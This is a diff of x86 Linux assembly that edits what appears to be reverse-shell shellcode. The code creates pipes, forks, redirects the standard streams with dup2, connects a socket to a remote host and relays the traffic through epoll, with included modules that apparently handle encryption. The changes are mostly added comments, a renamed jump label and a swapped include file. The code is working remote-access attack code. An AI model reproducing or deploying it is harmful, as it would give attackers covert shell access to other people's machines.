@@ -123,8 +123,8 @@ c_pipe:
       pop    eax
       mov    ebx, edi             ; ebx = p_in      
       int    0x80      
-      scasd
-      scasd
+      scasd                       ; += 4
+      scasd                       ; += 4
       loop   c_pipe    
       
       ; pid = fork();
@@ -132,8 +132,8 @@ c_pipe:
       pop    eax
       int    0x80    
       stosd                       ; save pid
-      test   eax, eax
-      jz     c_con
+      test   eax, eax             ; zero?
+      jz     opn_con              ; open connection
 
       ; in this order..
       ;
@@ -146,7 +146,7 @@ c_dup:
       mov    al, SYS_dup2
       int    0x80 
       dec    ecx
-      cmove  ebx, [ebp+p_in]
+      cmove  ebx, [ebp+p_in]      ; in[0] for last
       jns    c_dup  
   
       ; in this order..
@@ -208,14 +208,14 @@ c_con:
       ; connect (s, &sa, sizeof(sa));    
       push   0x10              ; sizeof(sa)      
       push   ecx               ; &sa
-      push   ebx               ; sockfd
+      push   ebx               ; s
       mov    ecx, esp          ; &args
       push   SYS_CONNECT
       pop    ebx               ; ebx=SYS_CONNECT
       push   SYS_socketcall
       pop    eax
       int    0x80      
-      
+          
       ; efd = epoll_create1(0);
       push   SYS_epoll_create1
       pop    eax
@@ -458,7 +458,7 @@ exit_recv:
       popad
       ret
       
-%include "mx.asm"
+%include "mxp.asm"
 %include "rnx.asm"
 %include "cpx.asm"
       
